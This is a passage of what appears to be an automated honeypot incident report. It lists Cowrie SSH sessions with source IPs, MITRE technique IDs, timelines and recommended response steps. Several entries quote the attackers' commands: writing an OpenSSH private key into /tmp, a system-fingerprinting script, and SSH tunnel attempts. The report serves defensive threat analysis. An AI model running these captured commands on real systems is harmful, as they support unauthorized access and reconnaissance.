| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:54:11` | `cowrie.session.connect` |
| `2026-09-03 16:54:11` | `cowrie.client.version` |
| `2026-09-03 16:54:11` | `cowrie.client.kex` |
| `2026-09-03 16:54:12` | `cowrie.login.success` |
| `2026-09-03 16:54:13` | `cowrie.session.params` |
| `2026-09-03 16:54:13` | `cowrie.command.input` |
| `2026-09-03 16:54:13` | `cowrie.session.file_download` |
| `2026-09-03 16:54:13` | `cowrie.session.file_download` |
| `2026-09-03 16:54:13` | `cowrie.log.closed` |
| `2026-09-03 16:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255c4b511a32

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:54 |
| **Last Seen** | 2026-09-03 16:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:54:35` | `cowrie.session.connect` |
| `2026-09-03 16:54:36` | `cowrie.client.version` |
| `2026-09-03 16:54:36` | `cowrie.client.kex` |
| `2026-09-03 16:54:39` | `cowrie.login.success` |
| `2026-09-03 16:54:40` | `cowrie.session.params` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.success` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.command.input` |
| `2026-09-03 16:54:40` | `cowrie.log.closed` |
| `2026-09-03 16:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51bd97c0da4f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:57 |
| **Last Seen** | 2026-09-03 16:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:57:25` | `cowrie.session.connect` |
| `2026-09-03 16:57:26` | `cowrie.client.version` |
| `2026-09-03 16:57:26` | `cowrie.client.kex` |
| `2026-09-03 16:57:30` | `cowrie.login.success` |
| `2026-09-03 16:57:32` | `cowrie.session.params` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.success` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.command.input` |
| `2026-09-03 16:57:32` | `cowrie.log.closed` |
| `2026-09-03 16:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3bcbdceeb5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:57 |
| **Last Seen** | 2026-09-03 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:57:38` | `cowrie.session.connect` |
| `2026-09-03 16:57:38` | `cowrie.client.version` |
| `2026-09-03 16:57:39` | `cowrie.client.kex` |
| `2026-09-03 16:57:39` | `cowrie.login.success` |
| `2026-09-03 16:57:40` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:57:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:57:40` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c00e68958f5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:00 |
| **Last Seen** | 2026-09-03 17:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:00:05` | `cowrie.session.connect` |
| `2026-09-03 17:00:07` | `cowrie.client.version` |
| `2026-09-03 17:00:07` | `cowrie.client.kex` |
| `2026-09-03 17:00:12` | `cowrie.login.success` |
| `2026-09-03 17:00:13` | `cowrie.session.params` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.success` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:13` | `cowrie.command.input` |
| `2026-09-03 17:00:14` | `cowrie.log.closed` |
| `2026-09-03 17:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd75dc4fcb51

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:01 |
| **Last Seen** | 2026-09-03 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:01:22` | `cowrie.session.connect` |
| `2026-09-03 17:01:22` | `cowrie.client.version` |
| `2026-09-03 17:01:23` | `cowrie.client.kex` |
| `2026-09-03 17:01:23` | `cowrie.login.success` |
| `2026-09-03 17:01:24` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:01:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:01:24` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0673514584c9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:02 |
| **Last Seen** | 2026-09-03 17:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:02:52` | `cowrie.session.connect` |
| `2026-09-03 17:02:53` | `cowrie.client.version` |
| `2026-09-03 17:02:53` | `cowrie.client.kex` |
| `2026-09-03 17:02:55` | `cowrie.login.success` |
| `2026-09-03 17:02:56` | `cowrie.session.params` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.success` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:56` | `cowrie.command.input` |
| `2026-09-03 17:02:57` | `cowrie.log.closed` |
| `2026-09-03 17:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22ca7834a7db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:05 |
| **Last Seen** | 2026-09-03 17:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:05:23` | `cowrie.session.connect` |
| `2026-09-03 17:05:23` | `cowrie.client.version` |
| `2026-09-03 17:05:25` | `cowrie.client.kex` |
| `2026-09-03 17:05:27` | `cowrie.login.success` |
| `2026-09-03 17:05:27` | `cowrie.session.params` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.success` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.command.input` |
| `2026-09-03 17:05:27` | `cowrie.log.closed` |
| `2026-09-03 17:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f27725cf507

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:08 |
| **Last Seen** | 2026-09-03 17:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:08:00` | `cowrie.session.connect` |
| `2026-09-03 17:08:01` | `cowrie.client.version` |
| `2026-09-03 17:08:01` | `cowrie.client.kex` |
| `2026-09-03 17:08:04` | `cowrie.login.success` |
| `2026-09-03 17:08:05` | `cowrie.session.params` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.success` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.command.input` |
| `2026-09-03 17:08:05` | `cowrie.log.closed` |
| `2026-09-03 17:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4da623bd7a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:08 |
| **Last Seen** | 2026-09-03 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:08:36` | `cowrie.session.connect` |
| `2026-09-03 17:08:36` | `cowrie.client.version` |
| `2026-09-03 17:08:36` | `cowrie.client.kex` |
| `2026-09-03 17:08:37` | `cowrie.login.success` |
| `2026-09-03 17:08:37` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:08:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:08:37` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79bb0aa93d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:10 |
| **Last Seen** | 2026-09-03 17:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:10:45` | `cowrie.session.connect` |
| `2026-09-03 17:10:46` | `cowrie.client.version` |
| `2026-09-03 17:10:46` | `cowrie.client.kex` |
| `2026-09-03 17:10:49` | `cowrie.login.success` |
| `2026-09-03 17:10:51` | `cowrie.session.params` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.success` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.command.input` |
| `2026-09-03 17:10:51` | `cowrie.log.closed` |
| `2026-09-03 17:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cbbb07c8589

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:10 |
| **Last Seen** | 2026-09-03 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:10:57` | `cowrie.session.connect` |
| `2026-09-03 17:10:57` | `cowrie.client.version` |
| `2026-09-03 17:10:57` | `cowrie.client.kex` |
| `2026-09-03 17:10:58` | `cowrie.login.success` |
| `2026-09-03 17:10:58` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:10:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:10:58` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a81433ee8e3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:13 |
| **Last Seen** | 2026-09-03 17:14 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:13:57` | `cowrie.session.connect` |
| `2026-09-03 17:14:01` | `cowrie.client.version` |
| `2026-09-03 17:14:01` | `cowrie.client.kex` |
| `2026-09-03 17:14:08` | `cowrie.login.success` |
| `2026-09-03 17:14:11` | `cowrie.session.params` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.success` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:11` | `cowrie.command.input` |
| `2026-09-03 17:14:12` | `cowrie.log.closed` |
| `2026-09-03 17:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbe01ae1209

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:16 |
| **Last Seen** | 2026-09-03 17:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:16:35` | `cowrie.session.connect` |
| `2026-09-03 17:16:36` | `cowrie.client.version` |
| `2026-09-03 17:16:36` | `cowrie.client.kex` |
| `2026-09-03 17:16:42` | `cowrie.login.success` |
| `2026-09-03 17:16:43` | `cowrie.session.params` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.success` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:43` | `cowrie.command.input` |
| `2026-09-03 17:16:44` | `cowrie.log.closed` |
| `2026-09-03 17:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390324dd3f5b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:19 |
